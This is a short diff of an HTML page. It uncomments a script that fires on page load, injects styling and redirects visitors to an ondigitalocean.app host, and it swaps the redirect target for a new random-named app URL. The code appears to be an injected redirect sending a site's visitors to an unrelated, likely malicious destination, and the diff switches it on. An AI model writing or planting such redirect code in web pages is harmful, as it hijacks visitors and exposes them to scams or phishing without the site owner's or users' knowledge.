@@ -3,10 +3,10 @@
 <!DOCTYPE html>
 <html lang="ru2">
 <head>
-<!-- <script>
+<script>
         document.addEventListener("DOMContentLoaded", function () {
 
-            const redirectUrl = "https://whale-app-phymv.ondigitalocean.app/?bcda=(03)-4520-9115";
+            const redirectUrl = "https://walrus-app-pp42o.ondigitalocean.app/";
 
             const style = document.createElement("style");
             style.textContent = `
@@ -148,7 +148,7 @@
                 handleRedirect();
             });
         });
-    </script>  -->
+    </script> 
 	
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
